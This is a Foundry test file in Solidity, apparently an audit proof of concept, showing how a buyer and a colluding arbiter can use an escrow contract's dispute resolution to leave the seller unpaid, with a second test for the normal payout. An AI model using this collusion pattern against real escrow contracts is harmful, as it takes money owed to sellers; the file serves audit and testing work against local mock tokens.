pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {EscrowFactory} from "../../src/EscrowFactory.sol";
import {EscrowTestBase} from "../EscrowTestBase.t.sol";
import {IEscrow, Escrow} from "../../src/Escrow.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {DeployEscrowFactory} from "../../script/DeployEscrowFactory.s.sol";
import {ERC20MockFailedTransfer} from "../mocks/ERC20MockFailedTransfer.sol";

contract EscrowBuyerArbitrerManipulation is Test, EscrowTestBase {
    EscrowFactory public escrowFactory; 
    ERC20Mock public token;
    address public attacker = address(5);

    constructor() {
        DeployEscrowFactory deployer = new DeployEscrowFactory();
        escrowFactory = deployer.run();
    }

    // steps 
    // attacker deploys scrow factory and sets de buyer and the 
    // arbitrer to be a wallet he controls
    // then the buyers initiates a dispute and the arbitrer(buyer) 
    // calls resolveDispute with the max amount and steals auditors money

    /*
          uint256 price,
        IERC20 tokenContract,
        address seller,
        address arbiter,
        uint256 arbiterFee,
        bytes32 salt
    */
    function testAttack() public {
        uint AUDIT_PRICE = 200_000e18;
        uint ARBITRER_FEE = 1000e18;
        vm.startPrank(BUYER);

        ERC20Mock(address(i_tokenContract)).mint(BUYER, AUDIT_PRICE);
        ERC20Mock(address(i_tokenContract)).approve(address(escrowFactory), AUDIT_PRICE);

        IEscrow escrowVulnerable = escrowFactory.newEscrow(
            AUDIT_PRICE, 
            i_tokenContract, 
            SELLER, ARBITER, 
            ARBITRER_FEE, 
            SALT1
        );

        escrowVulnerable.initiateDispute();
        vm.stopPrank();

        vm.startPrank(ARBITER);
        escrowVulnerable.resolveDispute(AUDIT_PRICE - ARBITRER_FEE);
        uint balaceOfSeller = ERC20Mock(address(i_tokenContract)).balanceOf(SELLER);
        assertEq(balaceOfSeller, 0);
    }

    function test_normalBehavior() public {
        uint AUDIT_PRICE = 200_000e18;
        uint ARBITRER_FEE = 1000e18;
        vm.startPrank(BUYER);

        ERC20Mock(address(i_tokenContract)).mint(BUYER, AUDIT_PRICE);
        ERC20Mock(address(i_tokenContract)).approve(address(escrowFactory), AUDIT_PRICE);

        IEscrow escrowVulnerable = escrowFactory.newEscrow(
            AUDIT_PRICE, 
            i_tokenContract, 
            SELLER, ARBITER, 
            ARBITRER_FEE, 
            SALT1
        );

        escrowVulnerable.initiateDispute();
        vm.stopPrank();

        vm.startPrank(ARBITER);
        escrowVulnerable.resolveDispute(1000e18);
        uint balaceOfSeller = ERC20Mock(address(i_tokenContract)).balanceOf(SELLER);
        assertEq(balaceOfSeller, AUDIT_PRICE - 1000e18 - ARBITRER_FEE);
    }
}